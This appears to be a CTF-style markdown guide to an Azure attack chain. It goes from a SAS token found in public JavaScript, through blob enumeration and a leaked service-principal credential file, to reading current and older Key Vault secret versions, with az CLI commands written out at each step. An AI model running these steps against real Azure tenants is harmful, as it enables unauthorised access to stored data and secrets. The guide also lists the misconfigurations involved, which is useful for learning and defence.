# Azure service

Microsoft Azure is a cloud platform that lets people and companies use computers, storage, databases, identity services, and other tools over the internet instead of managing their own hardware. Azure provides many services that help build, run, and secure applications in the cloud.


## Azure Storage SAS Token Misconfiguration → Key Vault Exposure

Azure Storage Shared Access Signatures (SAS) provide delegated access to Azure Storage resources without exposing the storage account key.

Flow:

```text
Web App → Public JavaScript → SAS Token → Azure Storage → Service Principal Credentials → Azure Key Vault → Secrets
```


## Finding Azure Information

The first step is checking the frontend source code and JavaScript files.

Look for:

- Storage account names
- Blob containers
- SAS tokens
- Hidden endpoints
- Hardcoded credentials
- API keys
- Vault names


Example JavaScript:

```javascript
const STORAGE_ACCOUNT = "storageaccount";
const BACKUPS_CONTAINER = "backups";
const BACKUP_SAS = "?sv=2022-11-02&ss=b&srt=sco&sp=rl..."
```


The SAS token permissions can reveal what access is available.

Example:

```text
sp=rl
```

Permissions:

- r = Read
- l = List
- w = Write
- d = Delete


## Enumerating Azure Storage

List storage containers using the exposed SAS token:

```bash
az storage container list \
--account-name <storage-account> \
--sas-token "<sas-token>"
```


Example output:

```text
$web
backups
vault
```


List blobs inside containers:

```bash
az storage blob list \
--account-name <storage-account> \
--container-name <container> \
--sas-token "<sas-token>" \
-o table
```


Look for interesting files:

- backup files
- configuration files
- credentials
- service accounts
- secret files


Download files:

```bash
az storage blob download \
--account-name <storage-account> \
--container-name <container> \
--name <filename> \
--file <output-file> \
--sas-token "<sas-token>"
```


## Service Principal Credential Exposure

A common Azure misconfiguration is storing service principal credentials inside publicly accessible storage containers.

Example leaked file:

```json
{
 "client_id":"xxxxxxxx",
 "client_secret":"xxxxxxxx",
 "tenant_id":"xxxxxxxx",
 "key_vault_name":"example-kv"
}
```


The service principal can then be used to authenticate:

```bash
az login --service-principal \
-u <client_id> \
-p <client_secret> \
--tenant <tenant_id>
```


After authentication, check the current identity:

```bash
az account show
```


Check permissions:

```bash
az role assignment list --all -o table
```


## Azure Key Vault Enumeration

After gaining access through the service principal, enumerate Key Vault secrets:

```bash
az keyvault secret list \
--vault-name <vault-name>
```


The first request only shows secret names.

Example:

```text
Name

key-shard-1
key-shard-2
key-shard-3
master-key
```


Retrieve secret values:

```bash
az keyvault secret show \
--vault-name <vault-name> \
--name <secret-name> \
--query value -o tsv
```


## Key Vault Secret Versions

Azure Key Vault stores previous secret versions.

If a secret was rotated, the old value may still exist.

List versions:

```bash
az keyvault secret list-versions \
--vault-name <vault-name> \
--name <secret-name>
```


Retrieve an older version:

```bash
az keyvault secret show \
--vault-name <vault-name> \
--name <secret-name> \
--version <version-id> \
--query value -o tsv
```


## Attack Chain

The full attack chain:

```text
Public Website
        |
        v
JavaScript Source Code
        |
        v
Exposed SAS Token
        |
        v
Azure Storage Enumeration
        |
        v
Credential File Exposure
        |
        v
Service Principal Login
        |
        v
Azure Key Vault Access
        |
        v
Secret Version Recovery
        |
        v
Flag / Sensitive Data
```


## Common Vulnerabilities

- SAS tokens exposed in frontend JavaScript.
- Storage containers allow excessive permissions.
- Backup containers contain sensitive files.
- Service principal credentials are stored in blobs.
- Key Vault permissions are too broad.
- Old secret versions are not deleted.
- Client-side applications contain cloud credentials.


## Useful Azure Enumeration Commands

Show current account:

```bash
az account show
```


List resources:

```bash
az resource list -o table
```


List resource groups:

```bash
az group list -o table
```


List storage accounts:

```bash
az storage account list -o table
```


List Key Vaults:

```bash
az keyvault list -o table
```


## Remember

The SAS token is not always the final target.

It is often the first step that leads to a stronger identity, which can then access more sensitive Azure resources.
